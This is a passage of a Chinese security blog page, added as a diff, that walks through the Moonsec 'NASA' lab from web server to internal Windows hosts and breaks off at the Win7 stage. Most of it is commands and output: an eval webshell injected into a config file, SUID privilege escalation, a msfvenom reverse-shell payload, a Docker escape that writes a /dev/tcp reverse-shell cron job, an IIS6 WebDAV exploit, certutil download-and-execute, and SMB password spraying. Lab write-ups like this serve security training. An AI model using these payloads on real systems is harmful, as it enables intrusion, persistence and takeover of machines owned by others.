@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            外网打点到内网域靶场-NASA |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"The price of doing the same old thing is far higher than the price of change."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">外网打点到内网域靶场-NASA</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2023-10-11 13:50:30</span>
+        <span class="mobile">2023-10-11 13:50</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">完整渗透测试靶场</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/docker%E9%80%83%E9%80%B8/">docker逃逸</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/IIS6-0%E6%BA%A2%E5%87%BA/">IIS6.0溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CVE-2021-42287/">CVE-2021-42287</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h1><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="/2023/10/11/NASA/image-20240125181223182.png" alt="NASA网络拓扑图.drawio"></p>
+<p>PS：该靶场作者：<a class="link" target="_blank" rel="noopener" href="https://www.moonsec.com/">暗月<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="VSP设置"><a href="#VSP设置" class="headerlink" title="VSP设置"></a>VSP设置</h2><p>这里用<code>192.168.0.1/24</code>网段代替外网，VPS地址为<code>192.168.0.208</code>。</p>
+<p>服务端：</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frps.toml</span></span><br><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">auth.token</span> = <span class="string">&quot;zzzzmoon199&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frpc.toml</span></span><br><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;192.168.0.208&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">auth.token</span> = <span class="string">&quot;zzzzmoon199&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;web&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O 192.168.0.208</span><br><span class="line"><span class="section">[sudo]</span> password for kali: </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) </span><br><span class="line">Nmap scan report for 192.168.0.208</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE              VERSION</span><br><span class="line">22/tcp   open  ssh                  OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http                 Apache httpd 2.4.10 ((Debian))</span><br><span class="line">7000/tcp open  ssl/afs3-fileserver?</span><br><span class="line">MAC Address: 00:0C:29:6F:46:67 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.26 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.0.208/&quot; -e php,htm,js,bak,zip,tar.gz,tgz,txt -i 200-399 </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, htm, js, bak, zip, tar.gz, tgz, txt | HTTP method: GET | Threads: 30 | Wordlist size: 12472</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/.dirsearch/reports/192.168.0.208.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/kali/.dirsearch/logs/errors.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.0.208/</span><br><span class="line"></span><br><span class="line"><span class="section">[22:11:45]</span> Starting: </span><br><span class="line"><span class="section">[22:11:55]</span> 200 -   61KB - /%3f/                                          </span><br><span class="line"><span class="section">[22:12:23]</span> 301 -  335B  - /.well-known/acme-challenge  -&gt;  http://192.168.0.208/.well-known/acme-challenge/</span><br><span class="line"><span class="section">[22:12:28]</span> 200 -   61KB - /0                                              </span><br><span class="line"><span class="section">[22:12:44]</span> 200 -  932B  - /Public/                                        </span><br><span class="line"><span class="section">[22:13:10]</span> 301 -  314B  - /admin  -&gt;  http://192.168.0.208/admin/         </span><br><span class="line"><span class="section">[22:13:14]</span> 200 -    1KB - /admin/                                         </span><br><span class="line"><span class="section">[22:13:14]</span> 200 -    1KB - /admin/?/login                                  </span><br><span class="line"><span class="section">[22:14:05]</span> 200 -   14KB - /article                                        </span><br><span class="line"><span class="section">[22:14:05]</span> 200 -   14KB - /article/admin/admin.asp                        </span><br><span class="line"><span class="section">[22:14:05]</span> 200 -   14KB - /article/admin                                  </span><br><span class="line"><span class="section">[22:14:05]</span> 200 -   14KB - /article/                                       </span><br><span class="line"><span class="section">[22:14:16]</span> 301 -  314B  - /cache  -&gt;  http://192.168.0.208/cache/         </span><br><span class="line"><span class="section">[22:14:16]</span> 200 -    5KB - /cache/                                         </span><br><span class="line"><span class="section">[22:14:19]</span> 200 -   16KB - /cart                                           </span><br><span class="line"><span class="section">[22:14:27]</span> 200 -  146B  - /config                                         </span><br><span class="line"><span class="section">[22:14:27]</span> 200 -  146B  - /config.js                                      </span><br><span class="line"><span class="section">[22:14:37]</span> 301 -  313B  - /data  -&gt;  http://192.168.0.208/data/           </span><br><span class="line"><span class="section">[22:14:37]</span> 200 -    1KB - /data/                                          </span><br><span class="line"><span class="section">[22:14:55]</span> 200 -    4KB - /favicon.ico                                    </span><br><span class="line"><span class="section">[22:15:09]</span> 200 -  230B  - /httpd.ini                                      </span><br><span class="line"><span class="section">[22:15:14]</span> 301 -  316B  - /install  -&gt;  http://192.168.0.208/install/     </span><br><span class="line"><span class="section">[22:15:15]</span> 200 -   96B  - /install/                                       </span><br><span class="line"><span class="section">[22:15:15]</span> 200 -   96B  - /install/index.php?upgrade/</span><br><span class="line"><span class="section">[22:15:16]</span> 200 -   61KB - /index.html                                     </span><br><span class="line"><span class="section">[22:15:16]</span> 200 -   61KB - /index.php                                      </span><br><span class="line"><span class="section">[22:16:00]</span> 200 -   86KB - /phpinfo.php                                    </span><br><span class="line"><span class="section">[22:16:12]</span> 301 -  315B  - /public  -&gt;  http://192.168.0.208/public/       </span><br><span class="line"><span class="section">[22:16:12]</span> 200 -    2KB - /public/                                        </span><br><span class="line"><span class="section">[22:16:16]</span> 200 -  215B  - /robots.txt                                     </span><br><span class="line"><span class="section">[22:16:39]</span> 301 -  317B  - /template  -&gt;  http://192.168.0.208/template/   </span><br><span class="line"><span class="section">[22:16:39]</span> 200 -    2KB - /template/                                      </span><br><span class="line"><span class="section">[22:16:47]</span> 200 -   88B  - /user.php   </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181311098.png" alt="image-20240125181311098"></p>
+<p><img src="/2023/10/11/NASA/image-20240125181332369.png" alt="image-20240125181332369"></p>
+<p><img src="/2023/10/11/NASA/image-20240125181346564.png" alt="image-20240125181346564"></p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h3><p>后台提交口令，社工字典生成器：<a class="link" target="_blank" rel="noopener" href="https://www.shentoushi.top/tools/dict/index.php">社工字典生成<i class="fas fa-external-link-alt"></i></a>。</p>
+<p><img src="/2023/10/11/NASA/image-20240125181408986.png" alt="image-20240125181408986"></p>
+<p><img src="/2023/10/11/NASA/image-20240125181419943.png" alt="image-20240125181419943"></p>
+<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>通过任意文件删除配合重装插入一句话到config文件中。</p>
+<p><img src="/2023/10/11/NASA/image-20240125181430740.png" alt="image-20240125181430740"></p>
+<p>数据表前缀插入一句话：</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xy_&#x27;)<span class="comment">;eval($_POST[cmd]);//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181444109.png" alt="image-20240125181444109"></p>
+<p><img src="/2023/10/11/NASA/image-20240125181456477.png" alt="image-20240125181456477"></p>
+<p>蚁剑连接执行查看权限：</p>
+<p><img src="/2023/10/11/NASA/image-20240125181509426.png" alt="image-20240125181509426"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Find-SUID提权"><a href="#Find-SUID提权" class="headerlink" title="Find SUID提权"></a>Find SUID提权</h3><p><img src="/2023/10/11/NASA/image-20240125181522040.png" alt="image-20240125181522040"></p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find shell.php -exec whoami \<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181530887.png" alt="image-20240125181530887"></p>
+<h3 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.0.12 lport=2233 -f elf &gt; re2233.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181539540.png" alt="image-20240125181539540"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@683a11bdee30:/app $ wget 192.168.0.12/re2233.elf</span><br><span class="line">www-data@683a11bdee30:/app $ <span class="built_in">chmod</span> +x ./re2233.elf</span><br><span class="line">www-data@683a11bdee30:/app $ find shell.php -<span class="built_in">exec</span> ./re2233.elf \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181550094.png" alt="image-20240125181550094"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.0.12 </span><br><span class="line">lhost =&gt; 192.168.0.12</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181605837.png" alt="image-20240125181605837"></p>
+<p>判断当前环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /.dockerenv</span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="built_in">cat</span> /proc/1/environ</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181617831.png" alt="image-20240125181617831"></p>
+<p>根据以上信息，判断当前环境在docker中。</p>
+<h3 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/status | grep Cap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181631855.png" alt="image-20240125181631855"></p>
+<p>查询对应出来的值为<code>0000003fffffffff</code>，可能是特权容器。</p>
+<h4 id="挂载宿主机目录"><a href="#挂载宿主机目录" class="headerlink" title="挂载宿主机目录"></a>挂载宿主机目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;root123:$1$root123$ZiuAO2uMtNBgXNF6wxsGX1:0:0::/root:/bin/bash&#x27;</span> &gt;&gt;/etc/passwd</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">fdisk -l</span><br><span class="line"><span class="built_in">mkdir</span> /test</span><br><span class="line">mount /dev/sda1 /test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181641772.png" alt="image-20240125181641772"></p>
+<h4 id="写入计划任务"><a href="#写入计划任务" class="headerlink" title="写入计划任务"></a>写入计划任务</h4><p>写入反弹shell的命令到宿主机的计划任务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * root bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.0.12/4113 0&gt;&amp;1&quot;&#x27;</span> &gt;&gt; /test/etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181657143.png" alt="image-20240125181657143"></p>
+<p>上线msf：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181708098.png" alt="image-20240125181708098"></p>
+<p>开启代理，内网扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy </span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; show options </span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; exploit </span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Starting the SOCKS proxy server</span><br></pre></td></tr></table></figure>
+
+<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181718370.png" alt="image-20240125181718370"></p>
+<h1 id="Win2003"><a href="#Win2003" class="headerlink" title="Win2003"></a>Win2003</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>上传fscan扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.188.1/24 -np -no</span><br><span class="line"></span><br><span class="line">   ___                              _  </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.0</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">192.168.188.136:80 open</span></span><br><span class="line"><span class="string">192.168.188.134:80 open</span></span><br><span class="line"><span class="string">192.168.188.134:135 open</span></span><br><span class="line"><span class="string">192.168.188.135:135 open</span></span><br><span class="line"><span class="string">192.168.188.135:139 open</span></span><br><span class="line"><span class="string">192.168.188.134:139 open</span></span><br><span class="line"><span class="string">192.168.188.134:445 open</span></span><br><span class="line"><span class="string">192.168.188.135:445 open</span></span><br><span class="line"><span class="string">192.168.188.1:7680 open</span></span><br><span class="line"><span class="string">192.168.188.1:7890 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 10</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]192.168.188.134</span></span><br><span class="line"><span class="string">   [-&gt;]win2003</span></span><br><span class="line"><span class="string">   [-&gt;]10.10.12.137</span></span><br><span class="line"><span class="string">   [-&gt;]192.168.188.134</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]192.168.188.135</span></span><br><span class="line"><span class="string">   [-&gt;]win7</span></span><br><span class="line"><span class="string">   [-&gt;]10.10.12.142</span></span><br><span class="line"><span class="string">   [-&gt;]192.168.188.135</span></span><br><span class="line"><span class="string">[*] WebTitle http://192.168.188.1:7890 code:400 len:0      title:None</span></span><br><span class="line"><span class="string">[*] WebTitle http://192.168.188.134    code:200 len:1193   title:None</span></span><br><span class="line"><span class="string">[+] MS17-010 192.168.188.134	(Windows Server 2003 3790 Service Pack 2)</span></span><br><span class="line"><span class="string">[+] MS17-010 192.168.188.135	(Windows 7 Ultimate 7601 Service Pack 1)</span></span><br><span class="line"><span class="string">[*] WebTitle http://192.168.188.136    code:200 len:15789  title:优惠券商城</span></span><br><span class="line"><span class="string">已完成 10/10</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 2m49.622070326s</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/10/11/NASA/image-20240125181730002.png" alt="image-20240125181730002"></p>
+<h2 id="IIS6-0溢出"><a href="#IIS6-0溢出" class="headerlink" title="IIS6.0溢出"></a>IIS6.0溢出</h2><p>EXPGithub地址：<a class="link" target="_blank" rel="noopener" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/tree/master">IIS6-exploit-2017-CVE-2017-7269<i class="fas fa-external-link-alt"></i></a>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 iis6webdav.py 192.168.188.134 80 192.168.0.12 5566</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181742506.png" alt="image-20240125181742506"></p>
+<p><img src="/2023/10/11/NASA/image-20240125181751678.png" alt="image-20240125181751678"></p>
+<p>上线CS：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://192.168.0.12:80/a.exe </span><br><span class="line">rename Blob0_0.bin a.exe</span><br><span class="line">.\a.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>CS插件<code>MS14-058</code>提权：</p>
+<p><img src="/2023/10/11/NASA/image-20240125181802972.png" alt="image-20240125181802972"></p>
+<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> <span class="string">&quot;C:\Documents and Settings\Administrator\root.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181813782.png" alt="image-20240125181813782"></p>
+<h1 id="Win7"><a href="#Win7" class="headerlink" title="Win7"></a>Win7</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>根据fscan扫描信息，收集用户名信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> users.txt         </span><br><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">win2003</span><br><span class="line">win7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181826146.png" alt="image-20240125181826146"></p>
+<p>通过明文进行爆破。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 10.10.12.134-136 -u ./users.txt -p <span class="string">&#x27;admin555&#x27;</span> -x <span class="built_in">whoami</span> --local-auth</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/11/NASA/image-20240125181836304.png" alt="image-20240125181836304"></p>
